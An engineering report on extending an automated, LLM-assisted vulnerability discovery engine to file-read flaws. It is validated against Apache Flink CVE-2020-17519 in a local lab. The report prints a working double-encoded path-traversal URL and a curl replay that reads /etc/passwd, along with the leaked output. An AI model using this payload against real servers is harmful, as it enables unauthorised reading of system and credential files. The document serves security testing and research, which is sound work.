# Discovery engine — the SECOND capability class (file read)

**The thesis test.** Slices 1–2 proved the discovery engine finds and confirms two
different-codebase **SSRF**s (GeoServer CVE-2021-40822, Solr RemoteStreaming) from one
`EGRESS_FETCH` catalog entry. That is transfer *within a class*. This slice is the
first test of the harder claim: does the capability-**catalog** abstraction hold a
class **other** than SSRF/egress-fetch, reducing to an **already-built** oracle, with
minimal new-class-specific code — or was the whole engine quietly SSRF-shaped?

**Fixture.** Apache Flink 1.11.2, Vulhub `flink/CVE-2020-17519` (`docker compose up -d`,
:8081). Unauthenticated arbitrary file read: the `/jobmanager/logs/:filename` REST
handler flows a request path parameter unsanitized into `new File(logDir, filename)`
(`JobManagerCustomLogHandler.getFile`); the fix wraps it in `new File(...).getName()`.
Open-source Java, **in-band** (the file bytes come back in the HTTP body) → reduces to
**P3** (content the payload never carried). Verified in-band, no OOB, before building.

---

## The deliverable metric — EXACTLY what the file-read class required

| Layer | SSRF (egress) | File read (this slice) | New code for the class? |
|---|---|---|---|
| **Catalog entry** | `EGRESS_FETCH_JAVA_OPENCONNECTION` → `_test_ssrf` | `FILE_READ_JAVA_FILE_SINK` → `_test_lfi`, `P3` | **1 entry** (`catalog.py`) |
| **Matcher / intent / reachability / hypothesis** | keyed on `PrimitiveClass` | *unchanged* — same functions | **none (extends, not forks)** |
| **Source sink idiom** | `openConnection()` / cross-class URL wrapper | `new File(dir,name)` / `FileInputStream` / `Files.read*` | **1 general idiom** |
| **Source channel idiom** | query / form param-bag | typed path param `getPathParameter(Xxx.class)` + `KEY` + route-from-`String.format` | **1 general idiom** |
| **Source guard idiom** | bypassable host-check → EXPOSED | basename-strip `.getName()`/canonicalize → SANCTIONED | **1 general idiom** |
| **Proof oracle** | in-band internal content | in-band file content — **the same `_test_lfi` P3 oracle** | **zero new proof code** |
| **Carrier (oracle-sensitivity)** | Host-alignment (`CARRIER_ALIGN_HOST`) | path-segment traversal (`CARRIER_PATH_TRAVERSAL`) | **1 carrier** |

Every Flink particular (`filename`, `/jobmanager/logs/:filename`,
`LogFileNamePathParameter`) is **learned from Flink's own source** — grep-clean, no
Flink literal in the engine, exactly the Solr discipline. The one place the file read
differed from a pure "reuse `_test_lfi`" was the **carrier**: the anticipated
per-capability oracle-sensitivity work (§4.1), reported below — not papered over.

### The oracle-sensitivity finding (the one real per-class cost)

The black-box `_test_lfi` methodology assumes a query-param LFI, where the payload's
literal slashes (`etc/passwd`) are fine. A URL-**path-segment** traversal is different:

- Flink URL-decodes the path segment **twice** (Netty routing, then the file load), so
  the traversal must be **double-encoded** (`..%252f`, which the phase-2 table entry
  `%252e%252e%252f` already produces). The generic path carrier
  (`_resolve_path_params`) `quote(safe="")`-**re-encodes** the value, turning `%252f`
  into `%25252f` and defeating the traversal.
- A **literal `/`** anywhere in the payload (the target's `etc/passwd` separator)
  splits the `:filename` segment and routes to a *different* handler → 404, no read.

The dedicated **`_path_send_probe`** carrier (attached per-instance when the channel is
a URL path param, the FILE_READ analogue of GeoServer's Host carrier) fixes both: it
substitutes the traversal token **verbatim** and normalises every remaining literal `/`
to the payload's own encoded-slash token, so the whole payload stays **one opaque path
segment**. The shared `_send_probe` / `_resolve_path_params` (IDOR's encoded `:id`) is
untouched — the dedicated-carrier discipline. **The carrier is load-bearing and
zero-FP:** the same endpoint probed WITHOUT the carrier confirms nothing (the mangled
traversal reads no file — no phantom).

---

## Live validation (real Flink, live Anthropic exploit LLM, no harness)

`python scripts/live_flink_discovery.py` — pre-flight (keys present + Anthropic ping +
Flink reachable), discovery through the **wired Orchestrator step**, proof through the
**real `run()` message-bus handoff** (`discovery_tasks` → `_parse_discovery_tasks` →
`_merge_discovery_tasks`), then a zero-FP control and a report/trace. `RESULT: PASS`.

### 1 — discovery from source (the gray-box value-add)

```
ingested files=4 coverage=partial tech=['Java']
  entrypoint: ['GET'] route='/jobmanager/logs/:filename' handler=JobManagerCustomLogHandler
              params=['filename'] path_params=['filename']
  call-site : file_read file_read() tainted_by='filename' guard=None @JobManagerCustomLogHandler.java:58
  Δ: exposed conf=0.75 :: no guard on the capability call site — present but unconstrained (intent-gap)
  reach: static_confirmed loc=path :: request param 'filename' → file_read() sink in JobManagerCustomLogHandler
  → ExploitTask: _test_lfi GET http://localhost:8081/jobmanager/logs/:filename
        params=['filename'] locations={'filename': 'path'} carrier=['carry_path_segment_traversal_raw']
```

The `:filename` traversal is a framework path parameter — not a crawlable link/form, so
a black-box crawl never enumerates it as an injection point; the gray-box source does.

### 2 — proof (in-band P3, raw-auditable ConfirmationEvidence)

The finding as persisted in `report.json` (status **confirmed**, HIGH):

```
[HIGH] Local File Inclusion in filename parameter  status=confirmed
  Response: matched /etc/passwd signature: root:x:0:0:
  primitives={'traversal_sequence': '%252e%252e%252f', ...}   phases_completed=6 verified=True
  confirmation=P3 target=GET http://localhost:8081/jobmanager/logs/
      %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd (file read /etc/passwd) status=200
  internal_content_marker='root:x:0:0:' (content we never sent; control_reflected_it=False)
  confirming_excerpt: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:…
  control [benign non-traversal filename 'clinkz_benign_control.txt' (no traversal — signature absent)] status=404
```

`confirming_target` is the **reproducible wire URL** (the carrier-normalised path), so a
reviewer can replay it verbatim — the synthesized payload alone (`…etc/passwd`, literal
slash) would 404. Replayed against live Flink:

```
$ curl .../jobmanager/logs/%252e%252e%252f…%252e%252e%252fetc%252fpasswd
root:x:0:0:root:/root:/bin/bash …                          # 200 — the leaked file
$ curl .../jobmanager/logs/clinkz_benign_control.txt
{"errors":["This file does not exist in JobManager log dir."]}   # 404 — control reads nothing
```

### 3 — zero-FP (reflection is not a file read)

The `/taskmanagers/:id` endpoint reflects the traversal string in a **500 stack trace**
but reads no file — the reflection-in-error phantom class. `_test_lfi` confirms **0**
findings there (it requires an actual file-content signature, never a reflected string).

**Artifacts** (raw, independently auditable):
`outputs/4cd5e101-ceb0-482e-83c1-ce6df4e08d1c/report_4cd5e101-ceb0-482e-83c1-ce6df4e08d1c.json`
and `.../trace.jsonl` (15 `_test_lfi` phase events, the `confirming_excerpt` preserved).

---

## No regression to the SSRF class

The keyless discovery gate (`tests/test_discovery/`, 50 tests) stays green — GeoServer
and Solr still lower their **byte-identical** `_test_ssrf` hypotheses (same target,
`carrier=[]` for Solr, Host carrier for GeoServer). The only change on the Solr side is
**additive and correct**: the new `FILE_READ` class *also* surfaces Solr's
`stream.file` → `new File(file)` (a genuine local-file-read vector), a bonus multi-class
transfer from the same catalog entry, not a regression. The Solr transfer tests were
updated to assert the SSRF hypothesis specifically (unregressed) and to document the
new file read.

## Verdict

The catalog genuinely holds **multiple classes**. Adding the second class cost one
catalog entry, three literal-free source idioms, one carrier, and **zero new proof
code** — the file read reduces to the same P3 oracle SSRF confirmations already use. A
patched fixture emits nothing (N/A by construction), the confirmation is raw-auditable
and reproducible, and the SSRF class is unregressed. The engine extends across a
capability class, not just a codebase.
